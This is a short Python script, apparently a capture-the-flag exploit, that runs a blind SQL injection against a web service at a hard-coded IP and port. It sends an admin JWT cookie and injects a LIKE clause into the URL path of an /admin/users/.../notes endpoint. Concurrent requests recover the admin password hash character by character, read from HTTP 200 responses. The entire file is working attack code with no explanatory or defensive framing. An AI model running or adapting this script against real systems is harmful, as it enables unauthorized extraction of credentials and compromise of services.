import asyncio
import string

from aiohttp import ClientSession

ALPH = list(set(string.ascii_letters.lower())) + list(string.digits)
AUTH = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImV4cCI6MTczMDIyMjgyOX0.wB0PzjpsfB4wXoXzE2JWV_aiEO0zDediGhdn3nBEa9Q'
SERVICE_HOST = '89.36.163.101:7777'

async def fetch_data(session: ClientSession, url) -> int:
    async with session.get(url, allow_redirects=False, headers={"Connection": "close"}) as response:
        return response.status

async def main():
    password_hash = ''

    for i in range(128):
        find_c = False
        urls = []
        for c in ALPH:
            password_hash_v = password_hash + c
            payload = f"admin' AND password_hash LIKE '{password_hash_v}%"
            url = f'http://{SERVICE_HOST}/admin/users/{payload}/notes'

            urls.append(url)

        async with ClientSession(cookies={"auth": AUTH}) as s:
            tasks = [fetch_data(s, url) for url in urls]
            results = await asyncio.gather(*tasks)


        for j, status_code in enumerate(results):
          if status_code == 200:
            password_hash = password_hash + ALPH[j]
            find_c = True
            break

        print(f'password_hash: {password_hash} (len: {len(password_hash)})')
        if not find_c:
            print("DONE!")
            break

    print("password_hash:", password_hash)


if __name__ == '__main__':
    asyncio.run(main())